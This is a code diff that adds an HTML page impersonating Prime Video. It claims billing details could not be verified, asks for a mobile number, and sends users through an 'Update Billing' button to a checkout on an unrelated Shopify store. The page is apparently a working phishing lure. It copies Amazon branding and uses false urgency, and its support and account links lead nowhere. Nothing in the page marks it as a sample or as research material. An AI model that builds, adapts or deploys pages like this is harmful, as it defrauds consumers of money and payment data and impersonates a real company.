@@ -1,0 +1,86 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Prime Video - Billing Update</title>
+  <style>
+    :root{--bg:#000000;--card:#1a1a1a;--text:#ffffff;--muted:#a0a0a0;--line:#333333;--accent:#137ed5;--shadow:0 2px 16px rgba(0,0,0,.5)}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Arial,Helvetica,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column}
+    .top{padding:18px 16px 12px;text-align:center;border-bottom:1px solid rgba(255,255,255,.08)}
+    .logo-text{display:block;font-size:1.6rem;font-weight:700;color:#fff;letter-spacing:.5px;margin:0 auto}
+    .logo-text span{color:var(--accent)}
+    .wrap{flex:1;display:grid;place-items:center;padding:24px 16px 44px}
+    .card{width:min(100%,520px);border:1px solid var(--line);border-radius:10px;background:var(--card);box-shadow:var(--shadow);padding:28px}
+    h1{font-size:1.95rem;line-height:1.12;margin-bottom:18px;font-weight:500}
+    .sub{font-size:1rem;color:var(--muted);line-height:1.55;margin-bottom:18px}
+    .notice{border:1px solid #2a2a2a;background:#111;border-radius:8px;padding:16px;margin-bottom:18px}
+    .notice strong{display:block;margin-bottom:6px;font-size:1rem;color:#fff}
+    .notice ul{margin:8px 0 0 18px;display:grid;gap:6px;line-height:1.55;color:#bbb}
+    .notice div{color:#bbb}
+    label{display:grid;gap:7px;font-size:.96rem;font-weight:700;margin-bottom:12px;color:#ddd}
+    input,select{height:46px;border:1px solid #444;border-radius:10px;padding:0 14px;font-size:1rem;outline:none;background:#111;color:#fff}
+    input::placeholder{color:#666}
+    select option{background:#111;color:#fff}
+    input:focus,select:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(19,126,213,.2)}
+    .btn{width:100%;height:46px;border:0;border-radius:999px;background:var(--accent);color:#fff;font-size:1rem;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;text-decoration:none;transition:opacity .2s ease,transform .2s ease}
+    .btn:hover{opacity:.88}.btn:active{transform:translateY(1px)}
+    .links{margin-top:16px;color:var(--muted);font-size:.92rem;line-height:1.5}
+    .links a{color:var(--accent);text-decoration:none}.links a:hover{text-decoration:underline}
+    .need{margin-top:18px;color:var(--accent);font-size:1rem}
+    .new{display:flex;align-items:center;gap:12px;margin:22px 0 18px;color:#555;font-size:.9rem}
+    .new:before,.new:after{content:"";height:1px;background:#2a2a2a;flex:1}
+    .create{display:flex;align-items:center;justify-content:center;height:46px;border:1px solid #444;border-radius:999px;text-decoration:none;color:#fff;font-weight:500;background:#111}
+    .create:hover{background:#222}
+    .footer-top{width:100%;border-top:1px solid #222;padding:22px 16px 14px;text-align:center;display:flex;gap:28px;justify-content:center;flex-wrap:wrap}
+    .footer-top a{font-size:.9rem;color:var(--accent);text-decoration:none}.footer-top a:hover{text-decoration:underline}
+    .footer-bot{text-align:center;color:#555;font-size:.85rem;padding-bottom:20px}
+    @media(max-width:520px){.card{padding:20px}h1{font-size:1.7rem}}
+  </style>
+</head>
+<body>
+  <header class="top">
+    <span class="logo-text">Prime <span>Video</span></span>
+  </header>
+  <main class="wrap">
+    <section class="card" aria-labelledby="title">
+      <h1 id="title">Billing Information Update Required</h1>
+      <div class="sub">Action Required: please update your billing details to continue using Prime Video services.</div>
+      <div class="notice">
+        <strong>Why am I seeing this message?</strong>
+        <div>Your current billing information could not be verified. This may happen because:</div>
+        <ul>
+          <li>An expired payment method</li>
+          <li>Incorrect billing details</li>
+          <li>A declined or failed payment</li>
+          <li>Changes to your payment provider</li>
+        </ul>
+      </div>
+      <label>Mobile number<input type="text" placeholder="Enter mobile number"></label>
+      <label>Billing country
+        <select>
+          <option>United States</option>
+        </select>
+      </label>
+      <a class="btn"
+   href="https://core-vista-2.myshopify.com/checkouts/cn/hWNDU9rsdxncjUsKITyJUOF0/en-us?_r=AQABKRCd2-z8zSu6Jp-ovFMzQTFGD5X4YrBJirKZAah39wM&preview_theme_id=161496858877"
+   target="_blank"
+   rel="noopener noreferrer">
+   Update Billing
+</a>
+      
+      <div class="links">Need help? <a href="#">Contact support</a> for assistance.</div>
+      <div class="need">Need help?</div>
+      <div class="new">New to Prime Video?</div>
+      <a class="create" href="#">Create your account</a>
+    </section>
+  </main>
+  <footer>
+    <div class="footer-top"><a href="#">Terms and Privacy Notice</a><a href="#">Send us feedback</a><a href="#">Help</a></div>
+    <div class="footer-bot">© 1996–2026, Amazon.com, Inc. or its affiliates</div>
+  </footer>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"bca23f4484304bf5a03dd72a8a9331fd","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
